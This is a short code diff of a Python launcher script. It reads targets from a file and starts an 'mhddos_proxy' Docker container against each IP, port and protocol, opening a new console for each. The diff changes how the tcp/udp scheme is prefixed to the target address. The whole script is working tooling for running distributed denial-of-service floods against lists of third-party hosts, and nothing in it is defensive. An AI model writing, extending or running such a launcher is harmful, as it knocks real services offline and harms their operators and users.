@@ -9,7 +9,6 @@ threads = 0
 duration = 0
 rpc = 0
 
-
 targets = []
 
 for i, line in enumerate(file):
@@ -28,7 +27,6 @@ for i, line in enumerate(file):
 const_part = "docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest "
 
 layer7 = " -t " + threads + " --rpc " + rpc + " --debug"
-layer4 = " " + threads + " " + duration
 
 for target in targets:
     ip = target[0]
@@ -36,7 +34,12 @@ for target in targets:
         current_parameters = parameters.upper().split('/')
         port = current_parameters[0]
         tool = current_parameters[1].lower()
-        command = const_part + tool + "://" + ip + ":" + port + layer7
+        command = const_part
+
+        if tool == 'tcp' or tool == 'udp':
+            command += tool + "://"
+
+        command += ip + ":" + port + layer7
 
         print(command)
         Popen(command, creationflags=subprocess.CREATE_NEW_CONSOLE)
